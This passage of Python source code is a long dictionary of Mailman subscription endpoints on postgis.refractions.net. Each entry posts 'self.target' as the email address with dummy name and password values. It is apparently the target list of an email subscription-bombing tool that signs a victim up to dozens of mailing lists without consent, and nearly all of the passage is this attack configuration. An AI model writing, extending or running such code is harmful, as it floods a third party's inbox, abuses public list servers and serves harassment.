                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sJGQr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/libro_sig',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/libro_sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HTTrt': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/librttopo-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/librttopo-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nCfoc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/linux-packaging',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/linux-packaging',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TutCo': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/lizmap',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/lizmap',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TyaPU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/lk-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/lk-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OTbWW': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/local-chapters',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/local-chapters',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sbXhu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/madagascar',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/madagascar',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SQFkM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/madrid',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/madrid',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'boYFb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapbender_commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapbender_commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qNfaD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapbender_dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapbender_dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yKyKD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapbender_users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapbender_users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yoKfi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapguide-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapguide-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FeKSa': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapguide-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapguide-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GfURE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapguide-internals',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapguide-internals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mbZDJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapguide-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapguide-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FkudE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapguide-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapguide-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rpbnu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapproxy',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapproxy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Taiic': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapproxy-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapproxy-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kFhrS': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapquery',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapquery',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uHQdv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapserver-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapserver-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ckZGQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapserver-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapserver-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hpMfd': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapserver-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapserver-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WsHcv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapserver-inspire',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapserver-inspire',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xhmfI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mapserver-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mapserver-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fNopZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/marketing',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/marketing',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iJCfA': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mdal-developer',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mdal-developer',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NeaSo': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/metacrs',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/metacrs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uXUsU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mexico',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mexico',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZOVgy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mobile',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mobile',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EYRFj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mobilitydb-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mobilitydb-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mmZsH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/mobilitydb-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/mobilitydb-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XJoBd': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/murcia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/murcia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RuvMV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/nas',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/nas',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GUpXL': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/newsletter',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/newsletter',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'meQhP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/nicaragua',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/nicaragua',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PUsja': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/nigeria',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/nigeria',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JzTzj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/nordic',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/nordic',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'inMBM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/northamerica',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/northamerica',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TltGC': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/oceania',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/oceania',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VqFVh': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/oceania-board',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/oceania-board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GMKGD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/opencitysmart',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/opencitysmart',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ceCvV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/opendronemap-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/opendronemap-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vXGlD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/opendronemap-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/opendronemap-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PRzXn': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/opengeoscience',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/opengeoscience',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tPkxf': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/openlayers-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/openlayers-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CyluD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/openlayers-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/openlayers-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DYcZc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/openlayers-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/openlayers-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kCEnS': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/openlayers-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/openlayers-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sblXz': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/opennoms',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/opennoms',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qqRwp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeo-bc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeo-bc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fZJOV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeo-china',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeo-china',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pflUI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeo-russia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeo-russia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cZyXE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeo4w-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeo4w-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WWuKn': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeo4w-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeo4w-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'npmZP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeojapan-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeojapan-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bXZfH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeojapan-board',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeojapan-board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DgXun': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeojapan-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeojapan-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BBZNf': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/osgeolive',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/osgeolive',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pwiOw': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/oskari-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/oskari-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sNFBo': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/otb-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/otb-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MQwIp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/ottawa_users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/ottawa_users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kGUnb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/owsjs',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/owsjs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eZeST': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/owslib-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/owslib-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YWFOu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/owslib-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/owslib-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'guEev': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pacific-islands',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pacific-islands',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WQOKA': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pal-developer',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pal-developer',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BsMwa': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pal-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pal-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xQZkC': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pdal',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pdal',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TFtHR': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pdal-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pdal-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qmwQp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pgpointcloud',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pgpointcloud',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YmGFJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pgrouting-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pgrouting-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LdbNq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pgrouting-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pgrouting-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CJomi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/philadelphia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/philadelphia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eHVnI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/philippines',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/philippines',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LuGym': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pointdown',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pointdown',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DlFzH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/poland',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/poland',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZJbez': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/portugal',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/portugal',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fppng': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/postgis-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/postgis-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YCnnM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/postgis-tickets',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/postgis-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UyjZZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/postgis-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/postgis-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XWNpB': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/proj',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/proj',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IxUzK': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/proj4j',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/proj4j',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LvAEI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/proj4php-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/proj4php-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bOpiX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/projects',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fjVvu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pycsw-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pycsw-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BWsJw': {
